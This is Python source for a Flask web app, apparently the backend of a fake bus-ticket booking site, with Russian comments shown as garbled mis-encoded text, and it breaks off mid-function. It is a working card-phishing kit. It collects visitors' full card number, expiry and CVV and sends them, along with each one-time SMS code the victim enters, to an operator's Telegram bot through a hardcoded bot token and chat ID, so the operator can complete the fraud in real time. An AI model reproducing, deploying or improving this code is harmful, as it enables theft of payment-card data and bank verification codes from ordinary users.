from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import uuid
import threading
import time
from datetime import datetime
import json
import logging
import os
import requests

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è Telegram –±–æ—Ç–∞
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '2063086506')

# –•—Ä–∞–Ω–∏–ª–∏—â–µ –∑–∞–∫–∞–∑–æ–≤ (–≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö)
orders = {}
confirmation_codes = {}
connected_clients = set()

def send_telegram_notification(chat_id, order_id, order_data):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –±–æ—Ç"""
    try:
        data = order_data['data']
        created_time = order_data['created_at'][:19].replace('T', ' ')
        order_type = order_data.get('order_type', 'standard')
        
        if order_type == 'payment':
            # –ü–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑ —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–∞—Ä—Ç—ã
            route_info = order_data.get('route_info', {})
            
            message = f"""üí≥ –ù–û–í–´–ô –ü–õ–ê–¢–Å–ñ!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üöå –ú–∞—Ä—à—Ä—É—Ç: {route_info.get('from_city', '')} ‚Üí {route_info.get('to_city', '')}
üìÖ –î–∞—Ç–∞ –ø–æ–µ–∑–¥–∫–∏: {route_info.get('travel_date', '')}
üí∫ –ú–µ—Å—Ç–æ: {route_info.get('seat', '')}

üí≥ –î–ê–ù–ù–´–ï –ö–ê–†–¢–´:
üî¢ –ù–æ–º–µ—Ä: {data.get('cardNumber', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üë§ –ò–º—è –Ω–∞ –∫–∞—Ä—Ç–µ: {data.get('cardName', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìÖ –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: {data.get('expiryDate', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üîê CVV: {data.get('cvv', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üí∞ –°—É–º–º–∞: {data.get('amount', 0)} z≈Ç

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"""
            
            # –ö–Ω–æ–ø–∫–∏ –¥–ª—è –ø–ª–∞—Ç–µ–∂–Ω–æ–≥–æ –∑–∞–∫–∞–∑–∞
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å SMS", "callback_data": f"send_sms_{order_id}"}
                    ],
                    [
                        {"text": "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", "callback_data": f"reject_{order_id}"}
                    ]
                ]
            }
        else:
            # –û–±—ã—á–Ω—ã–π –∑–∞–∫–∞–∑
            message = f"""üîî –ù–û–í–´–ô –ó–ê–ö–ê–ó!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìû –¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"""
            
            # –ö–Ω–æ–ø–∫–∏ –¥–ª—è –æ–±—ã—á–Ω–æ–≥–æ –∑–∞–∫–∞–∑–∞
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", "callback_data": f"approve_{order_id}"},
                        {"text": "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", "callback_data": f"reject_{order_id}"}
                    ],
                    [
                        {"text": "üìã –î–µ—Ç–∞–ª–∏", "callback_data": f"details_{order_id}"}
                    ]
                ]
            }
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Telegram API
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={
                'chat_id': chat_id,
                'text': message,
                'reply_markup': keyboard
            },
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info(f'–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id[:8]}')
        else:
            logger.error(f'–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è: {response.text}')
            
    except Exception as e:
        logger.error(f'–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram: {e}')

def send_code_notification(chat_id, order_id, user_code, order_data):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–≤–µ–¥–µ–Ω–Ω–æ–º –∫–æ–¥–µ"""
    try:
        data = order_data['data']
        created_time = order_data['created_at'][:19].replace('T', ' ')
        
        message = f"""üî¢ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –í–í–ï–õ –ö–û–î!

üë§ –ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}
üìß Email: {data.get('email', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}

üîê –í–í–ï–î–ï–ù–ù–´–ô –ö–û–î: {user_code}

üìÖ –í—Ä–µ–º—è: {created_time}
üÜî ID: {order_id[:8]}...

–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"""
        
        # –ö–Ω–æ–ø–∫–∏ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∫–æ–¥–∞
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", "callback_data": f"confirm_code_{order_id}"}
                ],
                [
                    {"text": "‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥", "callback_data": f"reject_code_{order_id}"}
                ]
            ]
        }
        
        response = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={
                'chat_id': chat_id,
                'text': message,
                'reply_markup': keyboard
            },
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info(f'–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∫–æ–¥–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id[:8]}')
        else:
            logger.error(f'–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∫–æ–¥–µ: {response.text}')
            
    except Exception as e:
        logger.error(f'–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∫–æ–¥–µ: {e}')

class OrderManager:
    def __init__(self):
        pass
    
    def create_order(self, order_data):
        order_id = str(uuid.uuid4())
        order = {
            'id': order_id,
            'data': order_data,
            'status': 'pending',
            'created_at': datetime.now().isoformat(),
            'confirmation_code': None,
            'order_type': order_data.get('order_type', 'standard'),
            'verification_type': None
        }
        orders[order_id] = order
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if ADMIN_CHAT_ID and BOT_TOKEN:
            threading.Thread(target=send_telegram_notification, args=(ADMIN_CHAT_ID, order_id, order)).start()
        
        return order_id
    
    def create_payment_order(self, payment_data):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–∫–∞–∑–∞ —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–∞—Ä—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã"""
        order_id = str(uuid.uuid4())
        # –î–æ–±–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã –ø—Ä—è–º–æ –≤ payment_data –¥–ª—è –ª–µ–≥–∫–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
        enriched_payment_data = payment_data.copy()
        
        order = {
            'id': order_id,
            'data': enriched_payment_data,  # –î–∞–Ω–Ω—ã–µ —É–∂–µ —Å–æ–¥–µ—Ä–∂–∞—Ç –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã
            'status': 'payment_pending',
            'created_at': datetime.now().isoformat(),
            'confirmation_code': None,
            'order_type': 'payment',
            'verification_type': None,
            'card_data': {
                'cardNumber': payment_data.get('cardNumber', ''),  # –ü–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã
                'cardName': payment_data.get('cardName', ''),
                'expiryDate': payment_data.get('expiryDate', ''),
                'cvv': payment_data.get('cvv', ''),  # –î–æ–±–∞–≤–ª—è–µ–º CVV
                'amount': payment_data.get('amount', 0)
            },
            'route_info': {
                'from_city': payment_data.get('from_city', ''),
                'to_city': payment_data.get('to_city', ''),
                'travel_date': payment_data.get('travel_date', ''),
                'seat': payment_data.get('seat', ''),
                'route_id': payment_data.get('route_id', '')
            }
        }
        orders[order_id] = order
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if ADMIN_CHAT_ID and BOT_TOKEN:
            threading.Thread(target=send_telegram_notification, args=(ADMIN_CHAT_ID, order_id, order)).start()
        
        return order_id
    
    def approve_order(self, order_id, verification_type='sms'):
        if order_id in orders:
            if orders[order_id]['order_type'] == 'payment':
                orders[order_id]['status'] = 'approved'
                orders[order_id]['verification_type'] = verification_type
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ —á–µ—Ä–µ–∑ WebSocket —á—Ç–æ –ø–ª–∞—Ç–µ–∂ –æ–¥–æ–±—Ä–µ–Ω –∏ –Ω—É–∂–Ω–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è
                socketio.emit('order_update', {
                    'type': 'order_approved',
                    'order_id': order_id,
                    'verification_type': verification_type
                })
            else:
                orders[order_id]['status'] = 'approved'
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ —á–µ—Ä–µ–∑ WebSocket —á—Ç–æ –∑–∞–∫–∞–∑ –æ–¥–æ–±—Ä–µ–Ω
                socketio.emit('order_update', {
                    'type': 'order_approved',
                    'order_id': order_id
                })
            
            return True
        return False
    
    def reject_order(self, order_id):
        if order_id in orders:
            orders[order_id]['status'] = 'rejected'
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ —á–µ—Ä–µ–∑ WebSocket
            socketio.emit('order_update', {
                'type': 'order_rejected',
                'order_id': order_id
            })
            
            return True
        return False
    
    def verify_code(self, order_id, code):
        """
        –ù–æ–≤–∞—è –ª–æ–≥–∏–∫–∞:
        1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç —Å–≤–æ–π –∫–æ–¥
        2. –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–æ–¥ –≤ –∑–∞–∫–∞–∑–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞–¥–º–∏–Ω—É
        3. –û—Ç–º–µ—á–∞–µ–º –∑–∞–∫–∞–∑ –∫–∞–∫ "–æ–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–∞"
        """
        if order_id in orders and orders[order_id]['status'] == 'approved':
            orders[order_id]['status'] = 'code_submitted'
            orders[order_id]['user_code'] = code
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º, —á—Ç–æ –∫–æ–¥ –ø—Ä–∏–Ω—è—Ç
            socketio.emit('order_update', {
                'type': 'code_submitted',
                'order_id': order_id,
                'code': code
            })
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∫–æ–¥–µ –≤ Telegram
            if ADMIN_CHAT_ID and BOT_TOKEN:
                threading.Thread(target=send_code_notification, args=(ADMIN_CHAT_ID, order_id, code, orders[order_id])).start()
            
            return True
        else:
            return False
    
    def confirm_code(self, order_id):
        """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∫–æ–¥–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º"""
        if order_id in orders and orders[order_id]['status'] == 'code_submitted':
            orders[order_id]['status'] = 'completed'
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ –æ–± —É—Å–ø–µ—à–Ω–æ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏
            socketio.emit('order_update', {
                'type': 'code_verified',
                'order_id': order_id
            })
            return True
        return False
    
    def reject_code(self, order_id):
        """–û—Ç–∫–ª–æ–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ (–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π)"""
        if order_id in orders and orders[order_id]['status'] == 'code_submitted':
            orders[order_id]['status'] = 'approved'  # –í–æ–∑–≤—Ä–∞—â–∞–µ–º –∫ —Å–æ—Å—Ç–æ—è–Ω–∏—é "–æ–∂–∏–¥–∞–Ω–∏–µ –∫–æ–¥–∞"
            orders[order_id]['user_code'] = None  # –û—á–∏—â–∞–µ–º –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–∞ –æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–º –∫–æ–¥–µ
            socketio.emit('order_update', {
                'type': 'code_rejected',
                'order_id': order_id,
                'message': '–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π'
            })
            return True
        return False
    
    def get_order(self, order_id):
        return orders.get(order_id)
    
    def get_pending_orders(self):
        return {k: v for k, v in orders.items() if v['status'] in ['pending', 'code_submitted', 'payment_pending']}

order_manager = OrderManager()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/bus')
def bus_booking():
    return render_template('bus_booking.html')

@app.route('/api/submit_order', methods=['POST'])
def submit_order():
    try:
        order_data = request.get_json()
        
        # –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
        required_fields = ['name', 'phone', 'email', 'from_city', 'to_city', 'travel_date', 'passengers']
        for field in required_fields:
            if not order_data.get(field):
                field_names = {
                    'name': '–∏–º—è',
                    'phone': '—Ç–µ–ª–µ—Ñ–æ–Ω', 
                    'email': 'email',
                    'from_city': '–≥–æ—Ä–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è',
                    'to_city': '–≥–æ—Ä–æ–¥ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è',
                    'travel_date': '–¥–∞—Ç–∞ –ø–æ–µ–∑–¥–∫–∏',
                    'passengers': '–∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤'
                }
                return jsonify({'error': f'–ü–æ–ª–µ "{field_names.get(field, field)}" –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ'}), 400
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –∑–∞–∫–∞–∑–∞ –ø–æ –Ω–∞–ª–∏—á–∏—é –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã
        has_card_data = all(field in order_data for field in ['cardNumber', 'expiryDate', 'cvv', 'cardName'])
        
        if has_card_data:
            # –ü–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑
            order_id = order_manager.create_payment_order(order_data)
        else:
            # –û–±—ã—á–Ω—ã–π –∑–∞–∫–∞–∑
            order_id = order_manager.create_order(order_data)
        
        logger.info(f"–ù–æ–≤—ã–π –∑–∞–∫–∞–∑ —Å–æ–∑–¥–∞–Ω: {order_id}")
        logger.info(f"–î–∞–Ω–Ω—ã–µ –∑–∞–∫–∞–∑–∞: {order_data}")
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': '–ó–∞–∫–∞–∑ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω'
        })
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–∫–∞–∑–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        order_id = data.get('order_id')
        code = data.get('code')
        
        if not order_id or not code:
            return jsonify({'error': '–ù–µ —É–∫–∞–∑–∞–Ω ID –∑–∞–∫–∞–∑–∞ –∏–ª–∏ –∫–æ–¥'}), 400
        
        success = order_manager.verify_code(order_id, code)
        
        if success:
            logger.info(f"–ö–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id} –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω —É—Å–ø–µ—à–Ω–æ")
            return jsonify({'success': True, 'message': '–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω'})
        else:
            logger.warning(f"–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id}")
            return jsonify({'error': '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥'}), 400
            
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

# API –¥–ª—è —Ç–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç–∞
@app.route('/api/bot/orders', methods=['GET'])
def get_pending_orders():
    """–ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –æ–∂–∏–¥–∞—é—â–∏—Ö –∑–∞–∫–∞–∑–æ–≤ –¥–ª—è –±–æ—Ç–∞"""
    try:
        pending = order_manager.get_pending_orders()
        return jsonify(pending)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–æ–≤: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/bot/approve/<order_id>', methods=['POST'])
def approve_order(order_id):
    """API –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞ –±–æ—Ç–æ–º"""
    try:
        # –ü–æ–ª—É—á–∞–µ–º —Ç–∏–ø –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –¥–ª—è –ø–ª–∞—Ç–µ–∂–Ω—ã—Ö –∑–∞–∫–∞–∑–æ–≤
        verification_type = 'sms'  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é
        if request.is_json:
            data = request.get_json()
            verification_type = data.get('verification_type', 'sms')
        
        ok = order_manager.approve_order(order_id, verification_type)
        if ok:
            logger.info(f"–ó–∞–∫–∞–∑ {order_id} –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            return jsonify({
                'success': True,
                'message': '–ó–∞–∫–∞–∑ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω',
                'verification_type': verification_type
            })
        else:
            return jsonify({'error': '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/bot/reject/<order_id>', methods=['POST'])
def reject_order(order_id):
    """API –¥–ª—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∑–∞–∫–∞–∑–∞ –±–æ—Ç–æ–º"""
    try:
        success = order_manager.reject_order(order_id)
        if success:
            logger.info(f"–ó–∞–∫–∞–∑ {order_id} –æ—Ç–∫–ª–æ–Ω–µ–Ω")
            return jsonify({'success': True, 'message': '–ó–∞–∫–∞–∑ –æ—Ç–∫–ª–æ–Ω–µ–Ω'})
        else:
            return jsonify({'error': '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∑–∞–∫–∞–∑–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/bot/order/<order_id>', methods=['GET'])
def get_order_details(order_id):
    """–ü–æ–ª—É—á–∏—Ç—å –¥–µ—Ç–∞–ª–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –∑–∞–∫–∞–∑–∞"""
    try:
        order = order_manager.get_order(order_id)
        if order:
            return jsonify(order)
        else:
            return jsonify({'error': '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–µ—Ç–∞–ª–µ–π –∑–∞–∫–∞–∑–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/bot/confirm_code/<order_id>', methods=['POST'])
def confirm_user_code(order_id):
    """API –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∫–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º"""
    try:
        ok = order_manager.confirm_code(order_id)
        if ok:
            logger.info(f"–ö–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id} –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
            return jsonify({
                'success': True,
                'message': '–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω'
            })
        else:
            return jsonify({'error': '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –∫–æ–¥ –Ω–µ –±—ã–ª –≤–≤–µ–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –∫–æ–¥–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/bot/reject_code/<order_id>', methods=['POST'])
def reject_user_code(order_id):
    """API –¥–ª—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –∫–æ–¥–∞ (–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥)"""
    try:
        ok = order_manager.reject_code(order_id)
        if ok:
            logger.info(f"–ö–æ–¥ –¥–ª—è –∑–∞–∫–∞–∑–∞ {order_id} –æ—Ç–∫–ª–æ–Ω–µ–Ω –∫–∞–∫ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π")
            return jsonify({
                'success': True,
                'message': '–ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω'
            })
        else:
            return jsonify({'error': '–ó–∞–∫–∞–∑ –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –∫–æ–¥ –Ω–µ –±—ã–ª –≤–≤–µ–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∫–æ–¥–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

# API –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–ª–∞—Ç–µ–∂–µ–π
@app.route('/api/payment/create', methods=['POST'])
def create_payment():
    """–°–æ–∑–¥–∞–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–Ω–æ–≥–æ –∑–∞–∫–∞–∑–∞ —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–∞—Ä—Ç—ã"""
    try:
        payment_data = request.get_json()
        
        # –í–∞–ª–∏–¥–∞—Ü–∏—è –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –ø–æ–ª–µ–π
        required_fields = ['name', 'phone', 'email', 'cardNumber', 'expiryDate', 'cvv', 'cardName']
        for field in required_fields:
            if not payment_data.get(field):
                return jsonify({'error': f'–ü–æ–ª–µ "{field}" –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ'}), 400
        
        # –°–æ–∑–¥–∞–µ–º –ø–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑
        order_id = order_manager.create_payment_order(payment_data)
        
        logger.info(f"–ù–æ–≤—ã–π –ø–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑ —Å–æ–∑–¥–∞–Ω: {order_id}")
        logger.info(f"–ö–∞—Ä—Ç–∞: ****{payment_data.get('cardNumber', '')[-4:]}, —Å—É–º–º–∞: {payment_data.get('amount', 0)} –∑–ª")
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': '–ü–ª–∞—Ç–µ–∂–Ω—ã–π –∑–∞–∫–∞–∑ —Å–æ–∑–¥–∞–Ω, –æ–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è'
        })
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–ª–∞—Ç–µ–∂–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/payment/status/<order_id>', methods=['GET'])
def get_payment_status(order_id):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–ª–∞—Ç–µ–∂–∞"""
    try:
        order = order_manager.get_order(order_id)
        if order:
            status_mapping = {
                'payment_pending': 'pending',
                'approved': 'verification',
                'code_submitted': 'verification', 
                'completed': 'completed',
                'rejected': 'rejected'
            }
            
